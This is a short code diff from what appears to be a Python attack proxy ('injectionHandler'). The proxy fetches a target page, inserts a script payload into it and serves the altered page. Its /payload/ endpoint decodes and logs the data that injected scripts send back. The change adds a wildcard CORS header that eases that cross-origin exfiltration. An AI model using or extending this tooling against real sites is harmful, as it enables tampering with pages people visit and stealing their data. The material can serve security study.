@@ -40,15 +40,19 @@ class injectionHandler(BaseHTTPRequestHandler):
 			script.string=payloadFunctions + payload
 			html.body.insert(0, script)
 			return str(html).encode()
-		
+
+	def end_headers (self):
+		self.send_header('Access-Control-Allow-Origin', '*')
+		BaseHTTPRequestHandler.end_headers(self)
+
 	def do_GET(self):
 		if self.path.startswith("/payload/"):
 			encPayload = str(self.path.split('/')[2])
 			decPayload = str(base64.b64decode(encPayload), "utf-8")
-			print ("RECEIVED PAYLOAD:" + decPayload)
+			print ("RECEIVED PAYLOAD: " + decPayload)
 			self.send_response(200)
 			return
-		self.send_response(200)
+		self.send_response(200)		
 		self.send_header('Content-type','text/html')
 		self.end_headers()
 		self.wfile.write(self.inject(urlopen(self.url).read()))
